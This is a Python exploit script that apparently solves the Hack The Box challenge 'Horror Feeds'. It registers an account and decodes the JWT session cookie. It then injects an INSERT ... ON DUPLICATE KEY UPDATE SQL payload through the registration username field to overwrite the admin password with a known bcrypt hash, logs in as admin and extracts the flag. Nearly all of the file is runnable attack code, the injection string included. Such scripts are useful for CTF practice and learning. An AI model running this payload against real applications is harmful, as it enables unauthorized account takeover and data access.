import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def decode_token_part(token):
	return base64.b64decode(token.encode() + b'='*(4 - (len(token)%4))).decode()

def register(s, url):
	register_path = url + '/api/register'
	login_path = url + '/api/login'
	data = {'username': 'gwyo', 'password': 'password123'}
	print('\n[+] Trying to register to the application...')
	r = s.post(register_path, json=data)
	print(r.text)
	time.sleep(1)
	print('\n[+] Trying to login to the application...')
	r = s.post(login_path, json=data)
	print(r.text)
	if r.status_code == 403:
		print('[-] Exploit failed <!>')
		sys.exit(1)
	time.sleep(1)
	session_token = s.cookies['session']
	print('[+] Found JWT managed session cookie:\t\t%s' % session_token)
	token = session_token.split('.')[0]
	print(len(token)%4)
	decoded_token = decode_token_part(token)
	print(decoded_token)
	jwt_token = decoded_token.split('"')[3]
	print(jwt_token)
	p1, p2, p3 = jwt_token.split('.')
	print('Header:\t%s' % decode_token_part(p1))
	print('Body:\t%s' % decode_token_part(p2))
	print('Signature:\t%s' % p3)
	return session_token

def get_flag(s, url, token):
	print("\n[+] Trying to change admin's password using ON DUPLICATE KEY query...")
	dashb_path = url + '/dashboard'
	register_path = url + '/api/register'
	login_path = url + '/api/login'
	cookies = {'session': token}
	s.cookies.clear()
	r = s.get(dashb_path, cookies=cookies, allow_redirects=False)
	time.sleep(1)
	payload = "admin\", \"gwyo\") ON DUPLICATE KEY UPDATE password=\"$2b$12$FcmH5i9tkxFNy5g4gtPU8OfmEpcwi0hnnLGr3LYz9cyTzynZlRlXa\"-- -"
	print('[+] PAYLOAD:')
	print(payload)
	time.sleep(1)
	query = f'INSERT INTO users (username, password) VALUES ("{payload}", "{{hashed}}")'
	print('\n[+] Query:')
	print(query)
	time.sleep(1)
	register_data = {
	"username": payload,
	"password": "S0mePassw0rd"
	}
	print('\n[+] Trying to change admin password through the register functionality...')
	r = s.post(register_path, json=register_data)
	print(r.text)
	time.sleep(1)
	login_data = {
	"username": "admin",
	"password": "password123"
	}
	print('\n[+] Trying to login to the application as admin with the new password ("password123")')
	r = s.post(login_path, json=login_data)
	print(r.text)
	time.sleep(1)
	r = s.get(dashb_path)
	# print(r.text)
	flag = re.search(r'<td>HTB{(.*)}</td>', r.text).group(1)
	print('FLAG:\nHTB{%s}' % flag)

def show_usage():
	print('[+] Usage: %s <TARGET>' % sys.argv[0])
	print('[+] Example: %s 127.0.0.1:1337' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] HTB Challenge: Horror Feeds')
	try:
		url = 'http://' + sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Vulnerabilities to execute /readflag on the target and retrieve the output\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			token = register(s, url)
			new_token = get_flag(s, url, token)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(1)

if __name__ == "__main__":
	main()
